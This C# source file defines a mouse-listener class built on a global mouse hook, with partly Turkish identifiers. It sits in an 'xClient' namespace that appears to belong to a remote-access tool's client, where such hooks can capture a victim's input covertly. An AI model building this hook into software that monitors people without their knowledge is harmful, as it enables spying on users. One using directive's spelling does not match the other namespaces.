using System;
using System.Windows.Forms;
using xClient.KuuhakuCekirdek.MouseKeyHook.Implementation;
using xClient.KuuhakuÇekirdek.MouseKeyHook.WinApi;

namespace xClient.KuuhakuÇekirdek.MouseKeyHook.Implementation
{
    internal abstract class MouseListener : BaseListener, FareEylemleri
    {
        private readonly TuşSeti m_DoubleDown;
        private readonly TuşSeti m_SingleDown;
        private Point m_PreviousPosition;

        protected MouseListener(Subscribe subscribe)
            : base(subscribe)
        {
            m_PreviousPosition = new Point(-1, -1);
            m_DoubleDown = new TuşSeti();
            m_SingleDown = new TuşSeti();
        }

        protected override bool Callback(CallbackData data)
        {
            var e = GetEventArgs(data);

            if (e.FareDown)
            {
                ProcessDown(ref e);
            }

            if (e.FareUp)
            {
                ProcessUp(ref e);
            }

            if (e.TekerlekKaydırıldı)
            {
                ProcessWheel(ref e);
            }

            if (HasMoved(e.Point))
            {
                ProcessMove(ref e);
            }

            return !e.İşlendi;
        }

        protected abstract EventArgsExtFare GetEventArgs(CallbackData data);

        protected virtual void ProcessWheel(ref EventArgsExtFare e)
        {
            OnWheel(e);
        }

        protected virtual void ProcessDown(ref EventArgsExtFare e)
        {
            OnDown(e);
            OnDownExt(e);
            if (e.İşlendi)
            {
                return;
            }

            if (e.Clicks == 2)
            {
                m_DoubleDown.Add(e.Button);
            }

            if (e.Clicks == 1)
            {
                m_SingleDown.Add(e.Button);
            }
        }

        protected virtual void ProcessUp(ref EventArgsExtFare e)
        {
            if (m_SingleDown.İçerir(e.Button))
            {
                OnUp(e);
                OnUpExt(e);
                if (e.İşlendi)
                {
                    return;
                }
                OnClick(e);
                m_SingleDown.Kaldır(e.Button);
            }

            if (m_DoubleDown.İçerir(e.Button))
            {
                e = e.ToDoubleClickEventArgs();
                OnUp(e);
                OnDoubleClick(e);
                m_DoubleDown.Kaldır(e.Button);
            }
        }

        private void ProcessMove(ref EventArgsExtFare e)
        {
            m_PreviousPosition = e.Point;

            OnMove(e);
            OnMoveExt(e);
        }

        private bool HasMoved(Point actualPoint)
        {
            return m_PreviousPosition != actualPoint;
        }

        public event MouseEventHandler MouseMove;
        public event EventHandler<EventArgsExtFare> MouseMoveExt;
        public event MouseEventHandler MouseClick;
        public event MouseEventHandler MouseDown;
        public event EventHandler<EventArgsExtFare> MouseDownExt;
        public event MouseEventHandler MouseUp;
        public event EventHandler<EventArgsExtFare> MouseUpExt;
        public event MouseEventHandler MouseWheel;
        public event MouseEventHandler MouseDoubleClick;

        protected virtual void OnMove(MouseEventArgs e)
        {
            var handler = MouseMove;
            if (handler != null) handler(this, e);
        }

        protected virtual void OnMoveExt(EventArgsExtFare e)
        {
            var handler = MouseMoveExt;
            if (handler != null) handler(this, e);
        }

        protected virtual void OnClick(MouseEventArgs e)
        {
            var handler = MouseClick;
            if (handler != null) handler(this, e);
        }

        protected virtual void OnDown(MouseEventArgs e)
        {
            var handler = MouseDown;
            if (handler != null) handler(this, e);
        }

        protected virtual void OnDownExt(EventArgsExtFare e)
        {
            var handler = MouseDownExt;
            if (handler != null) handler(this, e);
        }

        protected virtual void OnUp(MouseEventArgs e)
        {
            var handler = MouseUp;
            if (handler != null) handler(this, e);
        }

        protected virtual void OnUpExt(EventArgsExtFare e)
        {
            var handler = MouseUpExt;
            if (handler != null) handler(this, e);
        }

        protected virtual void OnWheel(MouseEventArgs e)
        {
            var handler = MouseWheel;
            if (handler != null) handler(this, e);
        }

        protected virtual void OnDoubleClick(MouseEventArgs e)
        {
            var handler = MouseDoubleClick;
            if (handler != null) handler(this, e);
        }
    }
}